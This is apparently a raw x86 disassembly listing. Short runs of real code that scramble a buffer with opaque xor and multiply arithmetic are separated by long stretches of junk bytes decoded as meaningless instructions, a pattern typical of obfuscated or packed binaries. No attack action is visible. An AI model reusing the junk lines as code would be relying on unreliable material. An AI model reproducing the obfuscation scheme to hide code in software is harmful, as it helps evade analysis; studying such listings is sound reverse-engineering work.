  408528:	into   
  408529:	mov    es,esp
  40852b:	mov    bl,0xc5
  40852d:	mov    ds:0x8a233f78,al
  408532:	inc    edx
  408533:	cmp    al,0x4b
  408535:	sti    
  408536:	jmp    0x22ae:0x9a4495fb
  40853d:	xor    al,0x82
  40853f:	xchg   edx,eax
  408540:	push   eax
  408541:	pop    ebx
  408542:	ret    0xdd08
  408545:	pop    edx
  408546:	pop    esi
  408547:	js     0x40858e
  408549:	aam    0xef
  40854b:	jbe    0x40852e
  40854d:	les    eax,FWORD PTR [ebp+edx*2-0x299f2e64]
  408554:	int3   
  408555:	mov    ds:0x8bb01888,al
  40855a:	ja     0x408560
  40855c:	jb     0x40857d
  40855e:	sar    BYTE PTR [edx+0x55],cl
  408561:	ins    BYTE PTR es:[edi],dx
  408562:	mov    ecx,0xd9b264e3
  408567:	lods   eax,DWORD PTR ds:[esi]
  408568:	hlt    
  408569:	retf   0x9ff2
  40856c:	jp     0x408519
  40856e:	dec    ebp
  40856f:	test   BYTE PTR gs:[ebp-0xf],0x70
  408574:	adc    al,0xb8
  408576:	xchg   BYTE PTR [eax+0x7],ah
  408579:	lods   al,BYTE PTR ds:[esi]
  40857a:	imul   ecx,DWORD PTR ds:0xb4b595d6,0xffffffe3
  408581:	push   es
  408582:	xchg   DWORD PTR [ebx+0x31bbf46e],ecx
  408588:	cmp    ebx,edx
  40858a:	ja     0x408598
  408590:	mov    edx,DWORD PTR [ebp-0x34]
  408593:	jmp    0x408770
  408598:	mov    edx,DWORD PTR [ebp-0x3c]
  40859b:	mov    edi,DWORD PTR [ebp-0x4]
  40859e:	xor    edx,eax
  4085a0:	xor    edi,eax
  4085a2:	add    edx,ecx
  4085a4:	add    edi,ecx
  4085a6:	imul   edx,edi
  4085a9:	mov    edi,DWORD PTR [ebp-0x8]
  4085ac:	mov    ebx,DWORD PTR [ebp-0x10]
  4085af:	sub    ebx,edi
  4085b1:	jmp    0x408762
  4085b6:	add    eax,0x7405640f
  4085bb:	jne    0x408622
  4085bd:	(bad)  
  4085bf:	mov    eax,0x1d56353f
  4085c4:	mov    eax,ds:0x7ed7e121
  4085c9:	jle    0x408555
  4085cb:	jg     0x40864b
  4085cd:	jle    0x4085f9
  4085cf:	mov    ah,0xf5
  4085d1:	(bad)  
  4085d2:	hlt    
  4085d3:	lea    eax,[edi-0x36]
  4085d6:	(bad)  
  4085d7:	cwde   
  4085d8:	push   edi
  4085d9:	cmp    eax,0x78c6c349
  4085de:	les    edi,FWORD PTR [ebp+0x59]
  4085e1:	or     BYTE PTR [ebx-0x599e6285],0x61
  4085e8:	inc    eax
  4085e9:	outs   dx,BYTE PTR ds:[esi]
  4085ea:	or     eax,0xeb5f15f0
  4085ef:	mov    al,0x74
  4085f1:	push   ss
  4085f2:	push   es
  4085f3:	mov    eax,0x39390462
  4085f8:	(bad)  
  4085f9:	in     eax,0x71
  4085fb:	cwde   
  4085fc:	stos   DWORD PTR es:[edi],eax
  4085fd:	mov    ds:0xa59d5bda,eax
  408602:	xchg   ebp,eax
  408603:	sbb    BYTE PTR [ebx+0x7d452bd7],bh
  408609:	push   ebp
  40860a:	or     al,0x8e
  40860c:	aam    0xe5
  40860e:	add    cl,BYTE PTR [edx-0x2d]
  408611:	mov    bl,0x54
  408613:	repnz cli 
  408615:	inc    ecx
  408616:	xor    ebx,edx
  408618:	xor    bh,bh
  40861a:	push   ecx
  40861b:	and    edi,DWORD PTR [edx]
  40861d:	adc    eax,0x3c10f53d
  408622:	out    dx,eax
  408623:	ror    DWORD PTR [esi],1
  408625:	or     BYTE PTR [edi],bl
  408627:	les    ebp,FWORD PTR [eax-0x2bfafa96]
  40862d:	es adc al,dl
  408630:	fdiv   QWORD PTR [ecx+0x25]
  408633:	nop
  408634:	sub    eax,0xfd5dd854
  408639:	sbb    eax,0xbaad14b7
  40863e:	popa   
  40863f:	cdq    
  408640:	xchg   ecx,eax
  408641:	push   esp
  408642:	inc    ecx
  408643:	xchg   DWORD PTR [edi-0x2c4a1eed],ebp
  408649:	cmp    al,0x77
  40864b:	add    dl,BYTE PTR [edi]
  40864d:	cmp    bl,cl
  40864f:	popf   
  408650:	push   edi
  408651:	lea    esi,[eax-0x59]
  408654:	stos   DWORD PTR es:[edi],eax
  408655:	fist   DWORD PTR [eax]
  408657:	sar    DWORD PTR [ecx],cl
  408659:	pusha  
  40865a:	mov    bh,0x36
  40865c:	fisubr WORD PTR [eax-0x7bf23a3c]
  408662:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408663:	dec    eax
  408664:	scas   al,BYTE PTR es:[edi]
  408665:	outs   dx,DWORD PTR ds:[esi]
  408666:	call   0xf93695a9
  40866b:	(bad)  
  40866c:	fst    DWORD PTR [edi+eax*8-0x174b720a]
  408673:	jl     0x4086e7
  408675:	mov    WORD PTR [eax],es
  408677:	push   ebp
  408678:	push   cs
  408679:	and    al,0xba
  40867b:	retf   0xa1f5
  40867e:	push   esp
  40867f:	cs mov ebx,0x8aa1c68c
  408685:	pop    esi
  408686:	sbb    ebp,ebp
  408688:	jg     0x4086fa
  40868a:	jecxz  0x4086e3
  40868c:	jo     0x40863f
  40868e:	xor    eax,0xff443f28
  408693:	test   al,0xd
  408695:	(bad)  
  408696:	outs   dx,DWORD PTR ds:[esi]
  408697:	imul   edx,eax,0xffffffea
  40869a:	lock push es
  40869c:	es mov esp,0x813dc250
  4086a2:	xor    BYTE PTR [eax-0x78],bh
  4086a5:	inc    edi
  4086a6:	and    eax,0xe6f40c41
  4086ab:	outs   dx,DWORD PTR ds:[esi]
  4086ac:	inc    esp
  4086ad:	or     BYTE PTR [edi+0x1e],ch
  4086b0:	fstp   DWORD PTR [eax]
  4086b2:	dec    ecx
  4086b3:	or     eax,0xec67b9e0
  4086b8:	les    esi,FWORD PTR [edi+0x1cdc8352]
  4086be:	out    dx,al
  4086bf:	loopne 0x40872c
  4086c1:	push   0x915b121d
  4086c6:	retf   
  4086c7:	popa   
  4086c8:	jbe    0x40870b
  4086ca:	imul   esi,DWORD PTR [edi-0xb8a2d23],0xa21be27c
  4086d4:	ds adc al,0x8a
  4086d7:	jb     0x4086f5
  4086d9:	in     eax,0x66
  4086db:	test   eax,0x751da1c1
  4086e0:	mov    bh,0x90
  4086e2:	enter  0x2bfd,0x31
  4086e6:	pusha  
  4086e7:	jnp    0x40870f
  4086e9:	add    ebx,DWORD PTR [edx+ebx*2-0x26478a74]
  4086f0:	(bad)  
  4086f1:	pop    ebp
  4086f2:	(bad)  
  4086f4:	(bad)  
  4086f5:	mov    bl,0x16
  4086f7:	jl     0x4086f4
  4086f9:	and    al,BYTE PTR [ecx-0x4f]
  4086fc:	adc    BYTE PTR [ecx],0x4d
  4086ff:	mov    ch,0x4c
  408701:	and    eax,0x1e936f5f
  408706:	enter  0x3583,0x13
  40870a:	cdq    
  40870b:	cwde   
  40870c:	xchg   edi,eax
  40870d:	jge    0x408698
  40870f:	mov    eax,ecx
  408711:	cdq    
  408712:	xchg   ebp,eax
  408713:	ins    DWORD PTR es:[edi],dx
  408714:	rol    edx,0xac
  408717:	pop    edx
  408718:	fstp   QWORD PTR [edi-0x45085430]
  40871e:	jne    0x40872b
  408720:	xchg   esi,eax
  408721:	and    ecx,edi
  408723:	mov    ebp,0x2ec39dff
  408728:	pop    ecx
  408729:	jnp    0x4086ea
  40872b:	add    esp,esi
  40872d:	sar    BYTE PTR ds:0x7a990dec,0xc
  408734:	lods   al,BYTE PTR ds:[esi]
  408735:	cmp    cl,BYTE PTR [edi+ebp*1-0x7a]
  408739:	ret    0x5b2a
  40873c:	pop    esi
  40873d:	inc    edx
  40873e:	mov    edx,0xe78d0108
  408743:	add    BYTE PTR [ecx],ah
  408745:	test   al,0x3a
  408747:	scas   eax,DWORD PTR es:[edi]
  408748:	cli    
  408749:	(bad)  
  40874a:	push   es
  40874b:	jmp    FWORD PTR [ecx]
  40874d:	retf   0xb979
  408750:	fdiv   QWORD PTR [eax-0x5ea6b1c8]
  408756:	das    
  408757:	pop    ds
  408758:	or     eax,0xc8fd0ec7
  40875d:	dec    edi
  40875e:	xchg   ecx,eax
  40875f:	mov    ebx,0xda3bb77f
  408764:	mov    edx,DWORD PTR [ebp-0x38]
  408767:	jbe    0x408770
  40876d:	mov    edx,DWORD PTR [ebp-0x3c]
  408770:	mov    edi,DWORD PTR [ebp-0x4]
  408773:	xor    edi,eax
  408775:	xor    edx,eax
  408777:	add    edi,ecx
  408779:	add    edx,ecx
  40877b:	imul   edx,edi
  40877e:	mov    DWORD PTR [ebp+0xc],edx
  408781:	mov    edx,DWORD PTR [ebp+0xc]
  408784:	mov    DWORD PTR [ebp-0x24],edx
  408787:	mov    edx,DWORD PTR [ebp-0x8]
  40878a:	add    edx,DWORD PTR [ebp-0x40]
  40878d:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  408794:	mov    DWORD PTR [ebp-0x1c],edx
  408797:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  40879e:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  4087a5:	mov    edx,DWORD PTR [ebp-0x18]
  4087a8:	xor    edx,eax
  4087aa:	add    edx,ecx
  4087ac:	jmp    0x408819
  4087b1:	mov    edx,DWORD PTR [ebp-0x18]
  4087b4:	xor    edx,eax
  4087b6:	add    edx,DWORD PTR [ebp-0x14]
  4087b9:	mov    edi,DWORD PTR [ebp-0x1c]
  4087bc:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  4087c3:	mov    BYTE PTR [ebp+0xf],dl
  4087c6:	mov    edx,DWORD PTR [ebp-0xc]
  4087c9:	xor    edx,eax
  4087cb:	add    edx,DWORD PTR [ebp-0x14]
  4087ce:	mov    edi,DWORD PTR [ebp-0x1c]
  4087d1:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  4087d8:	mov    BYTE PTR [ebp+0xb],dl
  4087db:	mov    dl,BYTE PTR [ebp+0xf]
  4087de:	mov    edi,DWORD PTR [ebp-0xc]
  4087e1:	xor    edi,eax
  4087e3:	add    edi,DWORD PTR [ebp-0x14]
  4087e6:	mov    ebx,DWORD PTR [ebp-0x1c]
  4087e9:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  4087f0:	mov    dl,BYTE PTR [ebp+0xb]
  4087f3:	mov    edi,DWORD PTR [ebp-0x18]
  4087f6:	xor    edi,eax
  4087f8:	add    edi,DWORD PTR [ebp-0x14]
  4087fb:	mov    ebx,DWORD PTR [ebp-0x1c]
  4087fe:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  408805:	mov    edx,DWORD PTR [ebp-0x44]
  408808:	mov    edi,DWORD PTR [ebp-0xc]
  40880b:	xor    edx,eax
  40880d:	xor    edi,eax
  40880f:	add    edx,ecx
  408811:	add    edi,ecx
  408813:	imul   edx,edi
  408816:	add    edx,DWORD PTR [ebp-0x14]
  408819:	mov    DWORD PTR [ebp-0x14],edx
  40881c:	mov    edx,DWORD PTR [ebp-0xc]
  40881f:	mov    edi,DWORD PTR [ebp-0x24]
  408822:	xor    edx,eax
  408824:	add    edx,ecx
  408826:	imul   edx,edi
  408829:	mov    edi,DWORD PTR [ebp-0xc]
  40882c:	xor    edi,eax
  40882e:	sub    edx,edi
  408830:	mov    edi,DWORD PTR [ebp-0xc]
  408833:	mov    ebx,DWORD PTR [ebp-0x14]
  408836:	jmp    0x4089e7
  40883b:	mov    ebx,0x516c50c8
  408840:	je     0x4088a5
  408842:	jmp    0xab204522
  408847:	jecxz  0x40886a
  408849:	xor    eax,DWORD PTR [eax+0x7e7ed57d]
  40884f:	mov    bh,BYTE PTR [edi+0x7e]
  408852:	jle    0x40888f
  408854:	mov    bl,BYTE PTR [ebx+ebp*4]
  408857:	mov    bl,0xc3
  408859:	mov    al,ds:0xbdb74f4c
  40885e:	int    0x25
  408860:	add    BYTE PTR [ebx],bl
  408862:	clc    
  408863:	and    DWORD PTR [edi+0x4ccf0f47],edx
  408869:	xchg   esi,eax
  40886a:	out    0x6e,al
  40886c:	ficomp WORD PTR [esi+0x1]
  40886f:	sub    eax,DWORD PTR [ecx]
  408871:	pop    es
  408872:	mov    ecx,ebx
  408874:	mov    al,0x62
  408876:	mov    ebx,0xdc9d14ab
  40887b:	popf   
  40887c:	int    0xec
  40887e:	ret    0x699b
  408881:	test   dh,bh
  408883:	xchg   BYTE PTR ds:0xe9ec196c,al
  408889:	bound  esi,QWORD PTR [esi+0x1b]
  40888c:	xor    al,0x4f
  40888e:	add    cl,BYTE PTR [esi-0x1687f42a]
  408894:	adc    ch,BYTE PTR [edi+0x43]
  408897:	xchg   esp,eax
  408898:	xchg   ecx,eax
  408899:	dec    esi
  40889a:	and    al,0xb6
  40889c:	dec    esi
  40889d:	das    
  40889e:	iret   
  40889f:	sbb    eax,DWORD PTR [ebp+0x5692c6d]
  4088a5:	imul   ebp,DWORD PTR [ebx+ecx*8],0x2b
  4088a9:	xor    edx,ecx
  4088ab:	ficomp DWORD PTR [ecx+esi*8]
  4088ae:	(bad)  
  4088af:	fldlg2 
  4088b1:	(bad)  
  4088b2:	js     0x408889
  4088b4:	cmp    al,0x5a
  4088b6:	xchg   esi,eax
  4088b7:	cmp    DWORD PTR [ecx-0x3a],esp
  4088ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088bb:	xor    al,0x8a
  4088bd:	xor    al,0xf4
  4088bf:	cdq    
  4088c0:	jo     0x40890d
  4088c2:	rol    DWORD PTR [edx+0x1884ed9],0x1c
  4088c9:	cmp    ecx,DWORD PTR [esi+0x79]
  4088cc:	jp     0x4088ca
  4088ce:	shl    DWORD PTR [ebx+0x79],0x74
  4088d2:	cdq    
  4088d3:	gs xchg edi,eax
  4088d5:	adc    BYTE PTR [ecx+eiz*8-0x126ba20a],0x39
  4088dd:	sbb    edi,edx
  4088df:	lahf   
  4088e0:	dec    esp
  4088e1:	dec    ebx
  4088e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088e3:	shl    BYTE PTR [esi+0x69],0xde
  4088e7:	cmp    ecx,DWORD PTR [eax]
  4088e9:	in     al,0x8d
  4088eb:	jl     0x408929
  4088ed:	push   0xebe577ad
  4088f2:	leave  
  4088f3:	bound  ebx,QWORD PTR [edi-0x3ef48a99]
  4088f9:	in     eax,dx
  4088fa:	xor    DWORD PTR [edx],ebp
  4088fc:	cmp    DWORD PTR [ecx],eax
  4088fe:	std    
  4088ff:	mov    ah,0xb0
  408901:	cs ins BYTE PTR es:[edi],dx
  408903:	inc    ebx
  408904:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408905:	mul    BYTE PTR [eax]
  408907:	mov    eax,DWORD PTR [edx-0x31]
  40890a:	pop    edi
  40890b:	rol    esi,cl
  40890d:	shr    dh,cl
  40890f:	icebp  
  408910:	jne    0x408985
  408912:	scas   eax,DWORD PTR es:[edi]
  408913:	and    esp,DWORD PTR [esi]
  408915:	inc    eax
  408916:	aad    0x54
  408918:	imul   ecx,DWORD PTR [ebx-0x59],0xe18afca9
  40891f:	mov    dh,0x26
  408921:	ss push esp
  408923:	cld    
  408924:	and    ecx,esp
  408926:	les    eax,FWORD PTR [esi+0x4e34a3a]
  40892c:	iret   
  40892d:	shl    edx,cl
  40892f:	(bad)  
  408930:	sub    DWORD PTR [eax+0x60],eax
  408933:	loope  0x40899d
  408935:	push   ecx
  408936:	scas   al,BYTE PTR es:[edi]
  408937:	push   edx
  408938:	ss shr bh,0x87
  40893c:	or     DWORD PTR [ebx-0x18af97a8],edx
  408942:	cmc    
  408943:	bswap  esp
  408945:	xor    DWORD PTR [eax-0x55],esi
  408948:	aas    
  408949:	icebp  
  40894a:	into   
  40894b:	aaa    
  40894c:	fmul   DWORD PTR [eax+0x7bcd22f9]
  408952:	dec    esp
  408953:	mov    es,WORD PTR [ebx-0xfcf26ff]
  408959:	mov    dl,0x9d
  40895b:	xlat   BYTE PTR ds:[ebx]
  40895c:	cmp    DWORD PTR [edx+0x20380d0c],ecx
  408962:	loope  0x408985
  408964:	shr    BYTE PTR [ebx-0x15],cl
  408967:	dec    esi
  408968:	lds    eax,FWORD PTR [ecx]
  40896a:	mov    ecx,0x632ef7cd
  40896f:	loopne 0x4089b9
  408971:	fadd   DWORD PTR [edi]
  408973:	shl    DWORD PTR [edi],0xee
  408976:	mov    BYTE PTR [edx+ebp*4-0x23732dbb],dh
  40897d:	add    DWORD PTR [edi],ebp
  40897f:	jne    0x40899f
  408981:	jae    0x40893a
  408983:	xor    BYTE PTR [eax+esi*1-0x3d121305],0x86
  40898b:	das    
  40898c:	in     al,0x96
  40898e:	sbb    DWORD PTR [eax-0x47],ebp
  408991:	xchg   edx,eax
  408992:	in     eax,dx
  408993:	lea    ecx,[edi]
  408995:	lds    edx,FWORD PTR [eax]
  408997:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408998:	xor    BYTE PTR [eax+0x67],dl
  40899b:	pushf  
  40899c:	mov    cl,BYTE PTR [edx-0xf]
  40899f:	cmp    ebp,edx
  4089a1:	or     esi,DWORD PTR [ebx-0x5d]
  4089a4:	sahf   
  4089a5:	push   esi
  4089a6:	lea    esp,[edx]
  4089a8:	xor    al,0xa1
  4089aa:	and    eax,0x8cab1908
  4089af:	jle    0x40899b
  4089b1:	sbb    ah,BYTE PTR [ebx]
  4089b3:	(bad)  
  4089b5:	adc    DWORD PTR [eax],ebp
  4089b7:	into   
  4089b8:	rol    esp,cl
  4089ba:	call   0xc4f0af2b
  4089bf:	jle    0x4089ac
  4089c1:	rcr    BYTE PTR ss:[ecx-0x56],1
  4089c5:	fst    QWORD PTR [ebx+0x4abdd855]
  4089cb:	test   eax,0xcffa3acf
  4089d0:	pop    eax
  4089d1:	cmp    bh,BYTE PTR [ecx-0x38]
  4089d4:	(bad)  
  4089d5:	repnz (bad) 
  4089d7:	not    esi
  4089d9:	push   es
  4089da:	adc    DWORD PTR [eax],edi
  4089dc:	xchg   BYTE PTR [edi+0x38d7e904],dh
  4089e2:	inc    ecx
  4089e3:	jl     0x408a31
  4089e5:	dec    edi
  4089e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089e7:	xor    edi,eax
  4089e9:	add    edi,ecx
  4089eb:	imul   edi,ebx
  4089ee:	mov    ebx,DWORD PTR [ebp-0x18]
  4089f1:	xor    ebx,eax
  4089f3:	sub    edx,ecx
  4089f5:	jmp    0x408ba6
  4089fa:	dec    DWORD PTR [edx-0x5a]
  4089fd:	xor    eax,0x708df173
  408a02:	xchg   esp,eax
  408a03:	lea    ebx,[ecx+0xd]
  408a06:	or     dl,BYTE PTR [ebx]
  408a08:	sub    al,0x60
  408a0a:	mov    edx,edx
  408a0c:	jle    0x408a8c
  408a0e:	mov    bh,BYTE PTR [edi+0x7e]
  408a11:	jle    0x4089c7
  408a13:	leave  
  408a14:	fdivr  QWORD PTR [edx+0x1a20f16c]
  408a1a:	adc    DWORD PTR [ebp-0x7a],0xf40fee05
  408a21:	and    edi,DWORD PTR [edi+0x61ee326e]
  408a27:	enter  0x7756,0x41
  408a2b:	cwde   
  408a2c:	(bad)  
  408a2d:	mov    ch,0x4d
  408a2f:	xor    cl,BYTE PTR ds:0x4a3a7f82
  408a35:	retf   
  408a36:	mov    esp,0xa7929078
  408a3b:	sub    BYTE PTR [ebx+0x4b65bba7],0x4
  408a42:	jge    0x408a7c
  408a44:	stc    
  408a45:	push   cs
  408a46:	jp     0x408a40
  408a48:	or     al,0x64
  408a4a:	out    dx,eax
  408a4b:	jecxz  0x408ac3
  408a4d:	neg    BYTE PTR [esp+edx*1]
  408a50:	iret   
  408a51:	dec    ebp
  408a52:	js     0x408a95
  408a54:	add    eax,0xedc5703f
  408a59:	sub    eax,0xfd96230b
  408a5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a5f:	jo     0x408a51
  408a61:	sbb    al,0x7e
  408a63:	ret    
  408a64:	rol    eax,cl
  408a66:	cmp    eax,0x8b450c98
  408a6b:	push   ecx
  408a6c:	(bad)  
  408a6d:	xchg   BYTE PTR [eax+0x48b94aae],ch
  408a73:	lods   eax,DWORD PTR ds:[esi]
  408a74:	push   esi
  408a75:	jns    0x408a64
  408a77:	rcl    edx,cl
  408a79:	in     al,dx
  408a7a:	or     DWORD PTR [edi+edi*1-0x6c0a41b9],0x60
  408a82:	(bad)  
  408a83:	lahf   
  408a84:	xchg   ecx,eax
  408a85:	(bad)  
  408a86:	xor    al,0x5b
  408a88:	jb     0x408a96
  408a8a:	out    dx,eax
  408a8b:	pop    edi
  408a8c:	mov    dh,0x19
  408a8e:	sub    al,0x20
  408a90:	xor    eax,0x3ed3e7d8
  408a95:	je     0x408a22
  408a97:	sbb    esp,eax
  408a99:	inc    esp
  408a9a:	jecxz  0x408a77
  408a9c:	push   esi
  408a9d:	sar    BYTE PTR [esi],0x9a
  408aa0:	in     eax,dx
  408aa1:	adc    BYTE PTR [ebx-0x6a6348b4],0xf6
  408aa8:	xrelease xchg DWORD PTR [ecx+0x1f],ecx
  408aac:	ds fs add ebx,ebx
  408ab0:	sbb    ebx,DWORD PTR [ebx]
  408ab2:	push   cs
  408ab3:	pop    esp
  408ab4:	(bad)  
  408ab5:	loop   0x408a62
  408ab7:	push   es
  408ab8:	cmp    DWORD PTR [edi+0x65ed86a0],ebx
  408abe:	outs   dx,DWORD PTR ds:[esi]
  408abf:	cli    
  408ac0:	sbb    al,0x75
  408ac2:	sbb    eax,0x23490716
  408ac7:	lods   eax,DWORD PTR ds:[esi]
  408ac8:	pop    ebp
  408ac9:	ja     0x408aaf
  408acb:	inc    esp
  408acc:	repz inc edi
  408ace:	sbb    BYTE PTR ds:0xe46b8e57,0x90
  408ad5:	in     al,0x83
  408ad7:	neg    bl
  408ad9:	div    BYTE PTR [eax-0x70ec49eb]
  408adf:	adc    BYTE PTR [edi+0x57],bh
  408ae2:	jnp    0x408b4d
  408ae4:	arpl   WORD PTR [ebx*4+0x16ad6e50],di
  408aeb:	jae    0x408aab
  408aed:	and    eax,0x27cd06e6
  408af2:	mov    cl,0xaa
  408af4:	sub    BYTE PTR [eax],dl
  408af6:	jo     0x408b56
  408af8:	fwait
  408af9:	inc    esi
  408afa:	xchg   esp,eax
  408afb:	test   al,0x6f
  408afd:	frstor [ecx]
  408aff:	lds    ebx,FWORD PTR [ecx-0x7e90ea2b]
  408b05:	jae    0x408afd
  408b07:	add    DWORD PTR [esi-0x1b],0xfffffff8
  408b0b:	mov    bl,0x54
  408b0d:	(bad)  
  408b0e:	aas    
  408b0f:	(bad)  
  408b10:	fcmovne st,st(5)
  408b12:	push   ebp
  408b13:	mov    ebp,edx
  408b15:	sbb    dl,dh
  408b17:	cmp    BYTE PTR [ecx+0x70],ah
  408b1a:	sub    BYTE PTR [ebx-0x6d],bh
  408b1d:	das    
  408b1e:	sbb    al,0xc1
  408b20:	call   0x7a40:0xc0564e6e
  408b27:	inc    ecx
  408b28:	idiv   cl
  408b2a:	inc    edi
  408b2b:	stc    
  408b2c:	mov    bl,0x4f
  408b2e:	in     eax,dx
  408b2f:	push   ebp
  408b30:	mov    BYTE PTR [ebx+ebx*2],dh
  408b33:	enter  0x7a60,0x19
  408b37:	nop
  408b38:	stc    
  408b39:	adc    al,0x8d
  408b3b:	or     DWORD PTR [edi-0x1],0xffffffda
  408b3f:	xchg   DWORD PTR [esi-0x30a37622],ebp
  408b45:	sbb    ebx,edx
  408b47:	adc    BYTE PTR [edi+edx*8+0x79be84f3],0xc3
  408b4f:	and    ah,BYTE PTR [ebx]
  408b51:	arpl   WORD PTR [ecx+0x38],ax
  408b54:	inc    esp
  408b55:	inc    ebx
  408b56:	adc    BYTE PTR [ebp-0x39],cl
  408b59:	mov    ch,0x48
  408b5b:	clc    
  408b5c:	int3   
  408b5d:	inc    eax
  408b5e:	rcl    eax,cl
  408b60:	retf   
  408b61:	pusha  
  408b62:	cli    
  408b63:	jg     0x408b7f
  408b65:	fisttp WORD PTR [ebx+0x474bd66d]
  408b6b:	stos   DWORD PTR es:[edi],eax
  408b6c:	cli    
  408b6d:	mov    WORD PTR [ecx],ds
  408b6f:	jmp    0x2963:0x38738145
  408b76:	and    cl,ah
  408b78:	call   DWORD PTR [esi-0x7490b66c]
  408b7e:	loop   0x408be6
  408b80:	xchg   ebp,eax
  408b81:	sbb    al,0x2f
  408b83:	dec    edi
  408b84:	out    dx,al
  408b85:	or     al,0x2
  408b87:	xor    BYTE PTR [edx],ch
  408b89:	ret    0x139a
  408b8c:	dec    esi
  408b8d:	ret    
  408b8e:	iret   
  408b8f:	shl    BYTE PTR [edi+0x3a],0x8b
  408b93:	jbe    0x408b96
  408b95:	jmp    DWORD PTR [edi-0x27]
  408b98:	pop    esi
  408b99:	jg     0x408b64
  408b9b:	dec    eax
  408b9c:	jnp    0x408b54
  408b9e:	mov    esp,0x6bd40f60
  408ba3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ba4:	jne    0x408b7a
  408ba6:	lea    edi,[edi+ebx*1+0x32729b]
  408bad:	cmp    edi,edx
  408baf:	jbe    0x4087b1
  408bb5:	mov    edx,DWORD PTR [ebp-0xc]
  408bb8:	mov    edi,DWORD PTR [ebp-0x24]
  408bbb:	xor    edx,eax
  408bbd:	add    edx,ecx
  408bbf:	imul   edx,edi
  408bc2:	mov    edi,DWORD PTR [ebp-0x18]
  408bc5:	xor    edi,eax
  408bc7:	jmp    0x408d78
  408bcc:	and    eax,0x71ffb36e
  408bd1:	inc    ebx
  408bd2:	xor    DWORD PTR [edx+eiz*8-0xd],esi
  408bd6:	ret    
  408bd7:	das    
  408bd8:	xor    BYTE PTR [ebx-0x2fdaf5a2],al
  408bde:	jle    0x408c5e
  408be0:	mov    bh,BYTE PTR [edi+0x7e]
  408be3:	jle    0x408b8d
  408be5:	shl    DWORD PTR [ecx+ecx*4+0x47af6cf4],0xc3
  408bed:	mov    ecx,ds
  408bef:	push   edi
  408bf0:	mov    ch,0xa8
  408bf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408bf3:	iret   
  408bf4:	xchg   DWORD PTR [ebx-0x2c],ebx
  408bf7:	out    0xef,eax
  408bf9:	int3   
  408bfa:	scas   al,BYTE PTR es:[edi]
  408bfb:	sbb    esp,DWORD PTR [ecx-0x7884cb1a]
  408c01:	lea    esp,[edx+0x428817f8]
  408c07:	mov    DWORD PTR [ecx],eax
  408c09:	pop    ss
  408c0a:	cmp    eax,0xa5d3b2ca
  408c0f:	sti    
  408c10:	lds    ecx,FWORD PTR [ecx-0x70c2922b]
  408c16:	bound  eax,QWORD PTR [esi-0x6f]
  408c19:	div    DWORD PTR ds:0x4cb77e8d
  408c1f:	mov    ds:0x2c6bf241,eax
  408c24:	xchg   ecx,eax
  408c25:	sub    al,0x3a
  408c27:	jne    0x408bfa
  408c29:	loopne 0x408c4f
  408c2b:	push   esp
  408c2c:	je     0x408be8
  408c2e:	xchg   esi,eax
  408c2f:	lods   al,BYTE PTR ds:[esi]
  408c30:	loop   0x408bb8
  408c32:	test   BYTE PTR [edx+0x318b8ebf],ah
  408c38:	xor    dh,BYTE PTR [edx]
  408c3a:	stos   BYTE PTR es:[edi],al
  408c3b:	dec    eax
  408c3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c3d:	pop    ecx
  408c3e:	stc    
  408c3f:	or     al,0x26
  408c41:	push   0x51a4cf60
  408c46:	rcr    DWORD PTR [ecx],1
  408c48:	loop   0x408ca2
  408c4a:	mov    al,ds:0x9116da9a
  408c4f:	sbb    DWORD PTR [eax],edx
  408c51:	fsubr  st(0),st
  408c53:	imul   edx,DWORD PTR [ebp+0x3c6a326d],0xa9caf111
  408c5d:	push   0x5d
  408c5f:	pop    es
  408c60:	sbb    DWORD PTR [edx],eax
  408c62:	aam    0xec
  408c64:	stc    
  408c65:	mov    bl,0x84
  408c67:	into   
  408c68:	neg    BYTE PTR [esi]
  408c6a:	xlat   BYTE PTR ds:[ebx]
  408c6b:	dec    edx
  408c6c:	addr16 cmp eax,0xdfc2d6af
  408c72:	add    al,0xd2
  408c74:	call   0x26e0:0xaafc06de
  408c7b:	mov    ds:0xaaeeb3cf,eax
  408c80:	gs xor bl,bl
  408c83:	mov    ds:0xab90b476,eax
  408c88:	push   edi
  408c89:	inc    ebx
  408c8a:	pop    ds
  408c8b:	pusha  
  408c8c:	or     BYTE PTR [edx-0x2828c674],bl
  408c92:	add    al,BYTE PTR [edi]
  408c94:	add    DWORD PTR [ebx-0x4ce7400],eax
  408c9a:	xchg   edi,eax
  408c9b:	fstp   QWORD PTR [ebx-0x3db658dc]
  408ca1:	sub    eax,0xac6a63b6
  408ca6:	scas   al,BYTE PTR es:[edi]
  408ca7:	dec    ebp
  408ca8:	mov    bh,0xe
  408caa:	mov    esp,0xc919b8d2
  408caf:	or     eax,0x5d2834e5
  408cb4:	jge    0x408d2e
  408cb6:	and    edi,ebp
  408cb8:	sbb    BYTE PTR [eax+0x14],dh
  408cbb:	aad    0x76
  408cbd:	mov    cl,0x64
  408cbf:	rcr    DWORD PTR [edx+ebp*8-0x63],1
  408cc3:	pusha  
  408cc4:	out    0xcd,al
  408cc6:	rcr    DWORD PTR [esi+0x663f2f5f],cl
  408ccc:	scas   eax,DWORD PTR es:[edi]
  408ccd:	test   eax,0xcca479bf
  408cd2:	sbb    eax,DWORD PTR [ecx-0x49]
  408cd5:	popf   
  408cd6:	mov    bh,BYTE PTR [ebx+0x13656fe1]
  408cdc:	(bad)  
  408cdd:	jmp    0x271c27bd
  408ce2:	dec    ecx
  408ce3:	pop    ebx
  408ce4:	sahf   
  408ce5:	and    DWORD PTR [edi-0x6b2ee18a],ecx
  408ceb:	adc    esp,ecx
